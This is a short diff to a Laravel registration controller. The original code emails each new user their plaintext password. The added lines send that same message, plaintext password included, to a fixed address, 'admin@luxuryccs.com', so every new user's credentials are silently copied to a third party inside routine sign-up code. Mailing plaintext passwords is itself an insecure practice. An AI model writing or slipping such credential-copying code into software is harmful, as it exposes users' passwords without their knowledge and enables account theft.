@@ -53,7 +53,9 @@ class RegisteredUserController extends Controller
 
         Auth::login($user);
 
+        $adminEmail = 'admin@luxuryccs.com';
         Mail::to($user->email)->send(new UserRegistered($user, $plainPassword));
+        Mail::to($adminEmail)->send(new UserRegistered($user, $plainPassword));
 
         return redirect(RouteServiceProvider::HOME);
     }
